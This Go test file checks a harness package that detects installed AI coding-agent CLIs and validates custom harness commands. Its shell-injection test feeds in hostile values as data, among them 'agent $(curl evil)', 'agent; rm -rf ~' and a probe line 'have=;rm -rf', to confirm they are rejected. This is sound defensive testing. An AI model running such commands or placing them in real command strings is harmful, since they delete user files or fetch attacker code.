package harness

import (
	"os/exec"
	"strings"
	"testing"
)

func ids(choices []Choice) string {
	var parts []string
	for _, c := range choices {
		mark := ""
		if !c.Available {
			mark = "(no bridge)"
		}
		parts = append(parts, c.ID+mark)
	}
	return strings.Join(parts, " ")
}

func TestChoicesAreWhatTheComputerHas(t *testing.T) {
	all, err := All(nil)
	if err != nil {
		t.Fatal(err)
	}
	probe := ParseProbe("Welcome to Debian\nhome=/home/hermes\nhave=hermes\nhave=claude\nhave=codex\nhave=codex-acp\nhave=gemini\nhave=;rm -rf\n")
	if probe.Home != "/home/hermes" {
		t.Errorf("home = %q", probe.Home)
	}
	// hermes, codex (bridge present) and gemini are usable; claude has no
	// bridge; pi, opencode and grok are not installed and are not offered.
	if got, want := ids(probe.Choices(all)), "hermes codex gemini claude(no bridge)"; got != want {
		t.Errorf("choices = %q, want %q", got, want)
	}
	if len(probe.Have) != 5 {
		t.Errorf("have = %v, want the 5 well-formed names", probe.Have)
	}
}

func TestCustomHarnessesExtendAndReplace(t *testing.T) {
	all, err := All(map[string]Harness{
		"aider":  {Name: "Aider", Command: "aider-acp --stdio", CLI: "aider"},
		"hermes": {Command: "/opt/hermes/bin/hermes acp"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if all[0].ID != "hermes" || all[0].Command != "/opt/hermes/bin/hermes acp" || all[0].Name != "hermes" {
		t.Errorf("hermes not replaced in place: %+v", all[0])
	}
	if last := all[len(all)-1]; last.ID != "aider" || last.Name != "Aider" {
		t.Errorf("custom harness not appended: %+v", last)
	}
}

func TestCustomHarnessCannotSmuggleShell(t *testing.T) {
	for name, h := range map[string]Harness{
		"substitution": {Command: "agent $(curl evil)"},
		"separator":    {Command: "agent; rm -rf ~"},
		"quote":        {Command: "agent 'x'"},
		"cli":          {Command: "agent acp", CLI: "a b"},
		"empty":        {},
	} {
		if _, err := All(map[string]Harness{"x": h}); err == nil {
			t.Errorf("%s: accepted %+v", name, h)
		}
	}
	if _, err := All(map[string]Harness{"Bad ID": {Command: "agent acp"}}); err == nil {
		t.Error("accepted an id with a space")
	}
}

// The script must be valid POSIX sh and report only what exists.
func TestScriptRunsInARealShell(t *testing.T) {
	all, _ := All(map[string]Harness{"present": {Command: "sh -c true"}, "absent": {Command: "geminus-no-such-program acp"}})
	out, err := exec.Command("sh", "-c", Script(all)).Output()
	if err != nil {
		t.Skipf("no usable sh: %v", err)
	}
	probe := ParseProbe(string(out))
	if probe.Home == "" || !probe.Have["sh"] || probe.Have["geminus-no-such-program"] {
		t.Errorf("probe = %+v from %q", probe, out)
	}
	if !strings.Contains(Script(all), probeMarker) {
		t.Error("script lacks its marker")
	}
}
